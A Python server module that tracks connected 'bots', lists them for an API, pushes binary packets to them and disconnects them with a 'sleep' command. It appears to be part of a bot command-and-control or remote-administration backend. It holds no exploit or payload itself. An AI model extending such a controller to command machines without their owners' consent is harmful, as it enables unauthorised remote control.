# backend/Services/ClientManager.py

import asyncio
from typing import Any, Dict, List, Optional, Tuple

import backend.LoggerWrapper as logger
from .network import pack_packet

active_clients: Dict[str, Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = {}
preview_cache: Dict[str, bytes] = {}


async def close_client(bot_identifier: str, send_sleep_command: bool = True) -> bool:
    """
    Завершает сессию конкретного бота и закрывает сетевое соединение.
    
    Схема отключения:
    [Command: sleep] -> [Close Socket] -> [Remove from active_clients]
    """
    client_session: Optional[Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = active_clients.pop(
        bot_identifier, 
        None
    )

    if not client_session:
        return False

    reader, writer = client_session

    try:
        if send_sleep_command:
            writer.write(b"sleep\n")
            await writer.drain()
        
        writer.close()
        await writer.wait_closed()
    except Exception:
        pass
    finally:
        logger.Log.info(f"[ClientManager] {bot_identifier} disconnected")
    
    return True


async def close_all_clients() -> int:
    """
    Выполняет массовое параллельное отключение всех активных ботов.
    
    Схема:
    [List IDs] -> [asyncio.gather] -> [Return Count]
    """
    if not active_clients:
        return 0

    bot_identifiers: List[str] = list(active_clients.keys())
    disconnection_tasks: List[Any] = [close_client(bot_id) for bot_id in bot_identifiers]
    
    results: List[bool] = await asyncio.gather(*disconnection_tasks)
    
    return len(results)


def list_clients() -> List[Dict[str, str]]:
    """
    Формирует список текущих онлайн-клиентов для API.
    
    Data Scheme:
    [{"id": str, "status": "online"}, ...]
    """
    return [{"id": bot_id, "status": "online"} for bot_id in active_clients]


async def send_binary_to_bot(bot_identifier: str, binary_packet: bytes) -> bool:
    """
    Транспортировка бинарного пакета до конечного сокета бота.
    
    Data Scheme:
    [Binary Packet] -> transport.write() -> transport.drain()
    """
    client_session: Optional[Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = active_clients.get(
        bot_identifier
    )

    if not client_session:
        return False

    try:
        writer: asyncio.StreamWriter = client_session[1]
        writer.write(binary_packet)
        await writer.drain()
        return True
    except Exception as error:
        logger.Log.error(f"[ClientManager] Send error to {bot_identifier}: {error}")
        return False